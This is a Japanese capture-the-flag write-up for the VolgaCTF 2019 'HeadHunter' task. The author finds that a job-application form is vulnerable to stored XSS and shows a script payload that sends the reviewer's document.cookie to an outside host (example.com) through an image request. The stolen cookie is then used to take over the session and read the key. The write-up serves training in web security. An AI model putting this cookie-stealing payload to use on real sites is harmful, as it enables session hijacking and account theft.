Volga CTF 2019予選：HeadHunter Quest

こんにちは！3月29日から31日まで、予選ラウンドVolgaCTF が開催されました。 主催者は、さまざまなカテゴリで多数のタスクを準備しました（ちなみに、新しいもの-偽物、偽情報を見つけるためのタスクなど）。 他の人と同じように、HeadHunterジョブの目標は、秘密鍵を取得することです。はじめに、WEB.pyファイルとサイトへのリンクを取得します。







脆弱性検索


リンクをクリックするとすぐにウェルカムメッセージが表示されます。登録しています。[職業]タブで、いくつかのフィールドのフォームを確認 します。情報を入力して送信してみます。フォームが正常に送信され、[マイリクエストリスト]タブに申請が保留中であることがわかります。数十秒後、ステータスが「閲覧済み」に変わり ます。添付ファイルを見てください。

db_get_cv（cvid）はデータベースからデータを受信し、小さな構造変更後にすべてのデータをテンプレートに提供します。

攻撃


この事実の組み合わせは、XSSの脆弱性の可能性についての考えを示唆しています。
典型的な攻撃を実行し、Image srcを使用してCookieを盗み、ドメインの制限を回避しようとしています。

<script language="javascript">
    var img = new Image();
    img.src = 'example.com?' + document.cookie;
    document.body.appendChild(img);
</script>

保護はなく、メッセージテキストはチェックなしでDOMに埋め込まれていると想定します。この場合、scriptタグ内のコードが実行を開始します。要素（画像）を作成してソースを割り当て、その後、要素をDOMに追加します。これにより、ブラウザはサーバーにリクエストを送信してダウンロードを試行します。

次に、フォームを含むリクエストに、スクリプトの追加フィールドを含め、送信して待機します。ステータスが「閲覧済み」に変わり、クエリパラメータにCookieが含まれるリクエストがサーバーに送信されます。

最後のステップは残ります-Cookieを取得してサイトに設定し、ページを更新してキーを取得します。 タスクは解決されました。
